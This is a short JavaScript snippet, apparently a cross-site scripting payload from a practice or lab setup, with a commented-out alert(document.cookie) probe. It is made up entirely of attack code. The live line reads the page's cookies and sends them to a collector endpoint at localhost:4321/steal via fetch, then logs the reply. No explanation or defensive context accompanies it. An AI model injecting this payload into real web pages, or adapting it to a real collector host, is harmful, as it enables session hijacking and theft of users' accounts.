// alert(document.cookie)
fetch("http://localhost:4321/steal?cookie=" + document.cookie)
    .then((response) => response.json())
    .then((json) => console.log(json));